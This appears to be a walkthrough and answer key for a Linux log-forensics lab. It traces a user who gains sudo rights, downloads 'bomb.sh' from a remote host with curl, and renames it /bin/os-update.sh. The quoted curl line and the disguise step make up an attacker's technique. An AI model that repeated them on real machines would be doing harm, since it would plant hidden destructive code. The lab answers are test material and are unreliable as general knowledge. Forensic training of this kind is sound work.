### The user installed a package on the machine using elevated privileges. According to the logs, what is the full COMMAND?

The first thing we will do is to check the sudo execution history by looking at the auth.log found in the /var/log file path.

cd /var/log
cat auth.log | grep install

## Answer: /usr/bin/apt install dokuwiki 

### What was the present working directory (PWD) when the previous command was run?
![Screenshot 2024-08-14 174323](https://github.com/user-attachments/assets/444efa92-47cf-4560-a761-0d4584d40833)

## Answer: /home/cybert

### 2. Which user was created after the package from the previous task was installed?
 use this command to get answer
 cat auth.log | grep adduser

![Screenshot 2024-08-14 175616](https://github.com/user-attachments/assets/a6ba0e60-9ba0-4131-8da6-30498a94cbf3)

## it-admin

### 3. A user was then later given sudo privileges. When was the sudoers file updated? (Format: Month Day HH:MM:SS)

## Dec 28 06:27:34

### A script file was opened using the “vi” text editor. What is the name of this file?
![Screenshot 2024-08-14 180628](https://github.com/user-attachments/assets/e868dd21-bcee-4ec2-a18c-0cbe3e25a8a9)

## bomb.sh

### 5. What is the command used that created the file bomb.sh?
![Screenshot 2024-08-14 191206](https://github.com/user-attachments/assets/0b9b0395-224e-4c77-9912-51b111bbffed)

## curl 10.10.158.38:8080/bomb.sh --output bomb.sh

### 6. The file was renamed and moved to a different directory. What is the full path of this file now?

![Screenshot 2024-08-14 191503](https://github.com/user-attachments/assets/36ab58c9-9ff0-43de-a57b-584ed8463e15)

## /bin/os-update.sh

### 7. When was the file from the previous question last modified? (Format: Month Day HH:MM)

## Dec 28 06:29

### 8. What is the name of the file that will get created when the file from the first question executes?

## goodbye.txt






